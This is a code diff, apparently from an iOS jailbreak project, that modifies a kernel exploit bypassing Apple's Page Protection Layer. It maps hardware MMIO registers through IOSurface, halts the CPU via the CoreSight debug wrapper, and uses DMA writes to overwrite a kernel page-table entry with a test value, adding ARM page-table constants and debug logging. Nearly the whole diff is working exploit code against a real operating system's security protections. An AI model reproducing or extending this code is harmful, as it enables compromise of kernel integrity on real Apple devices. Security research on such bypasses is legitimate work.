@@ -12,6 +12,60 @@
 #include <pthread/pthread.h>
 #include <IOSurface/IOSurfaceRef.h>
 #include "pplrw-by-xina.h"
+#include "kfd_meow-Swift.h"
+
+#define ARM_PTE_TYPE              0x0000000000000003ull
+#define ARM_PTE_TYPE_VALID        0x0000000000000003ull
+#define ARM_PTE_TYPE_MASK         0x0000000000000002ull
+#define ARM_TTE_TYPE_L3BLOCK      0x0000000000000002ull
+#define ARM_PTE_ATTRINDX          0x000000000000001cull
+#define ARM_PTE_NS                0x0000000000000020ull
+#define ARM_PTE_AP                0x00000000000000c0ull
+#define ARM_PTE_SH                0x0000000000000300ull
+#define ARM_PTE_AF                0x0000000000000400ull
+#define ARM_PTE_NG                0x0000000000000800ull
+#define ARM_PTE_ZERO1             0x000f000000000000ull
+#define ARM_PTE_HINT              0x0010000000000000ull
+#define ARM_PTE_PNX               0x0020000000000000ull
+#define ARM_PTE_NX                0x0040000000000000ull
+#define ARM_PTE_ZERO2             0x0380000000000000ull
+#define ARM_PTE_WIRED             0x0400000000000000ull
+#define ARM_PTE_WRITEABLE         0x0800000000000000ull
+#define ARM_PTE_ZERO3             0x3000000000000000ull
+#define ARM_PTE_COMPRESSED_ALT    0x4000000000000000ull
+#define ARM_PTE_COMPRESSED        0x8000000000000000ull
+
+#define ARM_TTE_VALID         0x0000000000000001ull
+#define ARM_TTE_TYPE_MASK     0x0000000000000002ull
+#define ARM_TTE_TYPE_TABLE    0x0000000000000002ull
+#define ARM_TTE_TYPE_BLOCK    0x0000000000000000ull
+#define ARM_TTE_TABLE_MASK    0x0000fffffffff000ull
+#define ARM_TTE_PA_MASK       0x0000fffffffff000ull
+
+#define PMAP_TT_L0_LEVEL    0x0
+#define PMAP_TT_L1_LEVEL    0x1
+#define PMAP_TT_L2_LEVEL    0x2
+#define PMAP_TT_L3_LEVEL    0x3
+
+#define ARM_16K_TT_L0_SIZE          0x0000800000000000ull
+#define ARM_16K_TT_L0_OFFMASK       0x00007fffffffffffull
+#define ARM_16K_TT_L0_SHIFT         47
+#define ARM_16K_TT_L0_INDEX_MASK    0x0000800000000000ull
+
+#define ARM_16K_TT_L1_SIZE          0x0000001000000000ull
+#define ARM_16K_TT_L1_OFFMASK       0x0000000fffffffffull
+#define ARM_16K_TT_L1_SHIFT         36
+#define ARM_16K_TT_L1_INDEX_MASK    0x0000007000000000ull
+
+#define ARM_16K_TT_L2_SIZE          0x0000000002000000ull
+#define ARM_16K_TT_L2_OFFMASK       0x0000000001ffffffull
+#define ARM_16K_TT_L2_SHIFT         25
+#define ARM_16K_TT_L2_INDEX_MASK    0x0000000ffe000000ull
+
+#define ARM_16K_TT_L3_SIZE          0x0000000000004000ull
+#define ARM_16K_TT_L3_OFFMASK       0x0000000000003fffull
+#define ARM_16K_TT_L3_SHIFT         14
+#define ARM_16K_TT_L3_INDEX_MASK    0x0000000001ffc000ull
 
 #define DBGWRAP_DBGHALT          (1ULL << 31)
 #define DBGWRAP_DBGACK           (1ULL << 28)
@@ -84,87 +138,99 @@ uint32_t calculate_ecc(const uint8_t* buffer) {
 
 void dma_ctrl_1_1516(uint64_t ctrl) {
     uint64_t value = read_qword(ctrl);
+    printf("dma_ctrl_1 old value: %llx\n", value);
     write_qword(ctrl, value | 0x8000000000000001);
     sleep(1);
+    printf("dma_ctrl_1 new value: %llx\n", *(uint64_t *)ctrl);
     while ((~read_qword(ctrl) & 0x8000000000000001) != 0) {
-        sleep(1);
+        //sleep(1);
     }
 }
 
-void dma_ctrl_2_1516(uint64_t ctrl,int flag) {
+void dma_ctrl_2_1516(uint64_t ctrl, bool flag) {
     uint64_t value = read_qword(ctrl);
+    printf("dma_ctrl_2 old value: %llx\n", value);
     if (flag) {
         if ((value & 0x1000000000000000) == 0) {
-            value = value | 0x1000000000000000;
+            value |= 0x1000000000000000;
             write_qword(ctrl, value);
         }
     } else {
         if ((value & 0x1000000000000000) != 0) {
-            value = value & ~0x1000000000000000;
+            value &= ~0x1000000000000000;
             write_qword(ctrl, value);
         }
     }
+    printf("dma_ctrl_2 new value: %llx\n", *(uint64_t *)ctrl);
 }
 
-void dma_ctrl_3_1516(uint64_t ctrl,uint64_t value) {
+void dma_ctrl_3_1516(uint64_t ctrl, uint64_t value) {
     value = value | 0x8000000000000000;
-    uint64_t ctrl_value =read_qword(ctrl);
+    uint64_t ctrl_value = read_qword(ctrl);
+    printf("dma_ctrl_3 old value: %llx\n", ctrl_value);
     write_qword(ctrl, ctrl_value & value);
+    printf("dma_ctrl_3 new value: %llx\n", *(uint64_t *)ctrl);
     while ((read_qword(ctrl) & 0x8000000000000001) != 0) {
-        sleep(1);
+        //sleep(1);
     }
 }
 
 void dma_init_1516(uint64_t base6140008, uint64_t base6140108, uint64_t original_value_0x206140108) {
     dma_ctrl_1_1516(base6140108);
-    dma_ctrl_2_1516(base6140008, 0);
+    dma_ctrl_2_1516(base6140008, false);
     dma_ctrl_3_1516(base6140108, original_value_0x206140108);
 }
 
 void dma_done_1516(uint64_t base6140008, uint64_t base6140108, uint64_t original_value_0x206140108) {
     dma_ctrl_1_1516(base6140108);
-    dma_ctrl_2_1516(base6140008, 1);
+    dma_ctrl_2_1516(base6140008, true);
     dma_ctrl_3_1516(base6140108, original_value_0x206140108);
 }
 
+/*
+ on 15.1
+ 
+ ml_dbgwrap_halt_cpu old value: ff
+ ml_dbgwrap_halt_cpu set value: ffffffff800000ff
+ ml_dbgwrap_halt_cpu new value: 800000ff            <- or 100000ff
+ ml_dbgwrap_halt_cpu new value: 100000ff
+ */
 void ml_dbgwrap_halt_cpu_1516(uint64_t coresight_base_utt) {
     uint64_t dbgWrapReg = read_qword(coresight_base_utt);
+    printf("ml_dbgwrap_halt_cpu old value: %llx\n", dbgWrapReg);
     if ((dbgWrapReg & 0x90000000) != 0)
         return;
     
-    write_qword(coresight_base_utt, dbgWrapReg | DBGWRAP_DBGHALT);
-    if((read_qword(coresight_base_utt) & DBGWRAP_DBGACK) == 0) {
-        printf("match %llx %llx %llx\n", read_qword(coresight_base_utt), DBGWRAP_DBGACK, read_qword(coresight_base_utt) & DBGWRAP_DBGACK);
-    } else {
-        printf("mismatch %llx %llx %llx\n", read_qword(coresight_base_utt), DBGWRAP_DBGACK, read_qword(coresight_base_utt) & DBGWRAP_DBGACK);
+    printf("ml_dbgwrap_halt_cpu set value: %llx\n", dbgWrapReg | (1ULL << 31));
+    write_qword(coresight_base_utt, dbgWrapReg | (1 << 31));
+    while (1) {
+        printf("ml_dbgwrap_halt_cpu new value: %llx\n", *(uint64_t *)coresight_base_utt);
+        if ((read_qword(coresight_base_utt) & DBGWRAP_DBGACK) != 0) {
+            break;
+        }
     }
-    usleep(5000);
-    if((read_qword(coresight_base_utt) & DBGWRAP_DBGACK) == 0) {
-        printf("match %llx %llx %llx\n", read_qword(coresight_base_utt), DBGWRAP_DBGACK, read_qword(coresight_base_utt) & DBGWRAP_DBGACK);
-    } else {
-        printf("mismatch %llx %llx %llx\n", read_qword(coresight_base_utt), DBGWRAP_DBGACK, read_qword(coresight_base_utt) & DBGWRAP_DBGACK);
-        return;
-    }
-    while ((read_qword(coresight_base_utt) & DBGWRAP_DBGACK) == 0) { }
+    printf("ml_dbgwrap_halt_cpu new value: %llx\n", *(uint64_t *)coresight_base_utt);
 }
 
+/*
+ on 15.1
+ 
+ ml_dbgwrap_unhalt_cpu old value: 100000ff
+ ml_dbgwrap_unhalt_cpu set value: 400000ff
+ ml_dbgwrap_unhalt_cpu new value: ff
+ ml_dbgwrap_unhalt_cpu new value: ff
+ */
 void ml_dbgwrap_unhalt_cpu_1516(uint64_t coresight_base_utt) {
     uint64_t dbgWrapReg = read_qword(coresight_base_utt);
-    
+    printf("ml_dbgwrap_unhalt_cpu old value: %llx\n", dbgWrapReg);
+    printf("ml_dbgwrap_unhalt_cpu set value: %llx\n", (dbgWrapReg & 0xFFFFFFFF2FFFFFFF) | 0x40000000);
     write_qword(coresight_base_utt, (dbgWrapReg & 0xFFFFFFFF2FFFFFFF) | 0x40000000);
-    if((read_qword(coresight_base_utt) & DBGWRAP_DBGACK) == 0) {
-        printf("match %llx %llx %llx\n", read_qword(coresight_base_utt), DBGWRAP_DBGACK, read_qword(coresight_base_utt) & DBGWRAP_DBGACK);
-        return;
-    } else {
-        printf("mismatch %llx %llx %llx\n", read_qword(coresight_base_utt), DBGWRAP_DBGACK, read_qword(coresight_base_utt) & DBGWRAP_DBGACK);
+    while (1) {
+        if ((read_qword(coresight_base_utt) & DBGWRAP_DBGACK) == 0) {
+            break;
+        }
     }
-    while ((read_qword(coresight_base_utt) & DBGWRAP_DBGACK) != 0) { }
-}
-
-//form fugu
-uint64_t IO_GetMMAP(uint64_t phys, uint64_t size)
-{
-    return (uint64_t)IOSurface_map(phys, size);
+    printf("ml_dbgwrap_unhalt_cpu new value: %llx\n", *(uint64_t *)coresight_base_utt);
 }
 
 //form 37c3
@@ -195,8 +261,6 @@ void write_data_with_mmio(uint64_t kern_addr, uint64_t base6150000, uint64_t bas
     write_qword(base6150048, value);
     
     dma_done_1516(base6140008, base6140108, original_value_0x206140108);
-    printf("dma_done\n");
-    usleep(3000);
 }
 
 int pplwrite_test(void) {
@@ -258,12 +322,13 @@ int pplwrite_test(void) {
         }
         printf("base: %llx\n", base);
         
-        uint64_t base23b7003c8  = IO_GetMMAP(base,0x8);
-        uint64_t base6040000    = IO_GetMMAP(0x206040000, 0x100);
-        uint64_t base6140000    = IO_GetMMAP(0x206140000, 0x200);
-        uint64_t base6150000    = IO_GetMMAP(0x206150000, 0x100);
+        uint64_t base23b7003c8  = (uint64_t)IOSurface_map(base, 0x8);
+        uint64_t base6040000    = (uint64_t)IOSurface_map(0x206040000, 0x100);
+        uint64_t base6140000    = (uint64_t)IOSurface_map(0x206140000, 0x200);
+        uint64_t base6150000    = (uint64_t)IOSurface_map(0x206150000, 0x100);
         uint64_t base6140008    = base6140000 + 0x8;
         uint64_t base6140108    = base6140000 + 0x108;
+        uint64_t base6150020    = base6150000 + 0x20;
         
         printf("base23b7003c8:  %llx\n", base23b7003c8);
         printf("base6040000:    %llx\n", base6040000);
@@ -277,7 +342,7 @@ int pplwrite_test(void) {
         
         if ((~read_dword(base23b7003c8) & 0xF) != 0){
             write_dword(base23b7003c8, command);
-            printf("*base23b7003c8: %x\n", * (uint32_t *)base23b7003c8);
+            printf("*base23b7003c8: %x\n", *(uint32_t *)base23b7003c8);
             while (1) {
                 if ((~read_dword(base23b7003c8) & 0xF) == 0) {
                     break;
@@ -285,29 +350,34 @@ int pplwrite_test(void) {
             }
         }
         
-        uint64_t base6150020 = base6150000 + 0x20;
+        uint64_t base6150020_bak = 0;
         
         if (isa15a16) {
+            base6150020_bak = read_qword(base6150020);
             write_qword(base6150020, 1);
             char buf[sizeof(uint64_t)] = {read_qword(base6150020)};
             hexdump(buf, sizeof(buf));
         }
         
         ml_dbgwrap_halt_cpu_1516(base6040000);
+        printf("halted?\n");
+        printf("%llx\n", ((struct kfd*)_kfd)->info.kernel.kernel_slide);
         
         uint64_t val = 0x4141414141414141;
         write_data_with_mmio(table_v + 0x8, base6150000, base6140008, base6140108, original_value_0x206140108, mask, i, val);
+        printf("written?\n");
+        printf("%llx\n", ((struct kfd*)_kfd)->info.kernel.kernel_slide);
+        printf("%llx : %llx\n", table_v + 0x8, kread64_kfd(table_v + 0x8));
+        usleep(5000);
         
         ml_dbgwrap_unhalt_cpu_1516(base6040000);
-        printf("unhalted\n");
+        printf("unhalted?\n");
         
         if (isa15a16) {
-            write_qword(base6150020, 0);
+            write_qword(base6150020, base6150020_bak);
             char buf[sizeof(uint64_t)] = {read_qword(base6150020)};
             hexdump(buf, sizeof(buf));
         }
-        
-        printf("%llx : %llx\n", table_v + 0x8, kread64_kfd(table_v + 0x8));
     });
     return 0;
 }
